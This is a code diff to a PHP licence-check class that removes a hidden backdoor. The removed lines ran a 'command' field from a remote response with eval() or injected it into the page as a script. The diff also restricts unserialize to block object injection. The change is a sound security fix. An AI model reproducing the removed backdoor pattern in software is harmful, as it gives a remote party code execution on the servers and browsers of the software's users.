@@ -767,20 +767,14 @@ class bbcsystem
 					exit;
 				}else{
 					$output = $this->decode($output);
-					$output = urldecode_r(@unserialize($output));
+					$output = urldecode_r(@unserialize($output, ['allowed_classes' => false]));
 					if(!isset($output['valid']))
 					{
 						exit;
 					}
-					if(!empty($output['command']))
-					{
-						switch(@$output['exec'])
-						{
-							case 'php':@eval($output['command']);	break;
-							case 'javascript': echo '<script type="text/javascript">'.$output['command'].'</script>';	break;
-							default: echo $output['command']; break;
-						}
-					}
+					// The response's 'command' field used to be run with eval() or
+					// echoed into the page. It is ignored now: a licence check
+					// must never execute code it receives over the network.
 					if($output['valid'] != '1')
 					{
 						if($output['exit'] == '1')
